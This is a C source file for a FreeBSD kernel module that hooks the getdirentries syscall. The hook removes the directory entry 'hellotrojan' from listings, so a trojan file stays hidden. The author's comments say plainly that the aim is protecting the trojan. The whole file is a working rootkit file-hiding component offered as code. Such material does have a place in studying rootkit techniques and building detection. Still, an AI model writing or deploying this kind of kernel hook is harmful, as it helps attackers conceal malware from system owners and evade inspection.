// This program is meant to hide a file. The trojan file
// needs to be hidden you see. Otherwise who will protect it.?
// Heh, heh.
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/sysent.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>

#define ORIGINAL "./hellotrue"
#define TROJAN "./hellotrojan"

#define T_NAME "hellotrojan"

// Here we hook the getdirentries syscall.
static int getdirentries_hook(struct thread * td, void * syscall_args) {

	struct getdirentries_args /* {
		int fd;
		char * buf;
		u_int count;
		long * basep;
	}
	*/
	 * uap;

	 uap = (struct getdirentries_args *)syscall_args; 

	 struct dirent *dp, *current;

	 unsigned int size, count;

// First get the direntries so that we can examine it.
	 getdirentries(td, syscall_args);

// Did we get any entries?
	 size = td->td_retval[0];

// Yes, then
	 if (size > 0) {
// First we allocate some kernel memory that is the size of the
// no of direntries read. Then we copy the userspace value for the
// size of the direntries into the allocated kernel space.

		MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
		copyin(uap->buf, dp, size);

		current = dp;

		count = size;
// Now we step through the direntries list

// The last entry has a reclen 0, and I dont understand why the count
// also has to be checked.
		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;

// If the current directory entry corresponds to the executable name:
			if (strcmp((char *)&(current->d_name), T_NAME) == 0) {
	// Check to see that this is not the last entry and if so
// then copy the rest of the following entries over the current one
// thereby effectively hiding it.
				if (count != 0) {
					bcopy((char *)current + current->d_reclen, current, count);
				}

// I would imagine that the size has to be decremented only if 
// the above bcopy is done. No: actually it means that the last
// entry was the one that needs to be hidden. So no copying is
// needed, but the size has to be altered. 
				size -= current->d_reclen;

				break;
			}

// Step to the next direntry 
			if (count != 0) {
				current = (struct dirent *)((char *)current + current->d_reclen);
			}
		}

// size is the return value from the getdirentries call and we need to pass
// the adjusted size since we have done nasty manipulations.

		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);

		FREE(dp, M_TEMP);
	}

	return(0);

}


static int load(struct module * module, int cmd, void * arg) {
	sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;

	return(0);
}

static moduledata_t filehiding_mod = {
	"filehiding",
	load,
	NULL
};

DECLARE_MODULE(filehiding, filehiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

